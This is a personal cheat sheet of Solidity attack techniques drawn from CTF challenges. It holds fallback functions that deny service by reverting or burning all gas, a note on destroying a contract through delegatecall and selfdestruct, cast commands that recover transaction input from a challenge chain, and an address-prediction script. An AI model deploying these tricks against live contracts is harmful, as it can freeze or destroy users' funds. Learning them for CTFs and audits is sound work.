# Solidity Hacks I learned Other than normal hacks or extension to those hacks
## Denial of service
- if the call is been checked if its getting success or not we can simple not provide a function to receive ether to fail the `call` ie no `fallback` or `receive` function
- if the call is not getting checked we can cause denial of service by wasting the whole gas which could be used for the functionality of the function two ways shown below btw change `fallback` or `receive` according to need
```
fallback() external payable {
	assembly {
		invalid()
	}
}
```
```
fallback() external payable {
	uint a;
	while(true) {
		a++;
	}
}
```
---
# Reading logs and fetching inputs
- https://medium.com/@rumpell/htb-honor-among-thieves-d7c58d51ee89
##### Indexing Logs 
- main goal here is to find the tx hash whose input we want 
```
❯ cast logs --from-block 0 --to-block latest --rpc-url http://83.136.255.150:51157/rpc "event Voice(uint256 indexed severity)" 5
- address: 0xe77D5f3D6Fb1F6a83cEc370bc89a83b44041f268
  blockHash: 0x3dbd38e6994babb19d2267cf92641411257ec5f72b49c9806644910bd749c8d4
  blockNumber: 86
  data: 0x
  logIndex: 0
  removed: false
  topics: [
  	0x8be9391af7bcf072cee3c17fdbdfa444b42ad0d498941bcd0eb684da1ebe0d62
  	0x0000000000000000000000000000000000000000000000000000000000000005
  ]
  transactionHash: 0xeeb2a9125c9a9eea70060936e593bb91b061be593a41244406eb1f5288d29511                <=== Important value
  transactionIndex: 0
```
- explaination
```
❯ cast logs --from-block 0 --to-block latest --rpc-url <RPC CHAIN> <EVENT SIGNATURE> <INDEXING BY VALUE>
```
##### Retrieving transaction details
- Transaction details contains all the information of that particular transaction on the rpc chain
```
❯ cast tx --rpc-url http://83.136.255.150:51157/rpc 0xeeb2a9125c9a9eea70060936e593bb91b061be593a41244406eb1f5288d29511

blockHash            0x3dbd38e6994babb19d2267cf92641411257ec5f72b49c9806644910bd749c8d4
blockNumber          86
from                 0xb10e4D9Cea2e2aB84469B03C585b3F8939331BD9
gas                  49445
gasPrice             3000000000
hash                 0xeeb2a9125c9a9eea70060936e593bb91b061be593a41244406eb1f5288d29511
input                0x52eab0fac934bea75a4e0ad9e44675c4417e72d321e9c29987e4061c081ff2838a01bf05                <== Important value abi encoded
nonce                85
r                    0x3a1475a0bb844fd95d9e8d601b47c14000a8612db4d27ef607d636a893f67bee
s                    0x1961438a69444a2b9992279f169be805722ecfa37bd057151ca8c44ef81794c6
to                   0xe77D5f3D6Fb1F6a83cEc370bc89a83b44041f268
transactionIndex     0
v                    0
value                0

```
- explaination
```
cast tx --rpc-url <RPC CHAIN> <TRANSACTION HASH>
```
##### Abi Decoding Input
- input can be easily decoded by passing the function signature which was called during the transaction
```
❯ cast calldata-decode "talk(bytes32)" 0x52eab0fac934bea75a4e0ad9e44675c4417e72d321e9c29987e4061c081ff2838a01bf05
0xc934bea75a4e0ad9e44675c4417e72d321e9c29987e4061c081ff2838a01bf05
```
- explaination
```
❯ cast calldata-decode <FUNCTION SIGNATURE> <ABI ENCODED INPUT>
```
---
# Constructing custom calls solidity
- Best and easy video for explaination - https://www.youtube.com/watch?v=jSLECrvkPzg&t=727s
- slots are of 32 bytes
- Dynamic call data (function selector + position of input starting + size of input + input )
- Static call data (function selector + input)
---
# delegateCall to contract self destruction
- if any contract has an option to `delegatecall` to an contract we can destroy it by calling selfdestruct from another contract.
- learned from Ethernaut: MotorBike Challenge
---
# Ethereum Contract Address generation logic
- `address` is the deployer of the contract
- `nonce` are the no. of transactions done by the account
- https://gist.github.com/root-tanishq/79c8ef4c126c118ae6d4ef4dfc7d67c4
```python
import rlp
from eth_utils import keccak, to_checksum_address, to_bytes

def mk_contract_address(sender: str, nonce: int) -> str:
    sender_bytes = to_bytes(hexstr=sender)
    raw = rlp.encode([sender_bytes, nonce])
    h = keccak(raw)
    address_bytes = h[12:]
    return to_checksum_address(address_bytes)

print(mk_contract_address('0xaDb67e10Fa330db49e98201B4c5F19356CfA3f59',0))
```
---
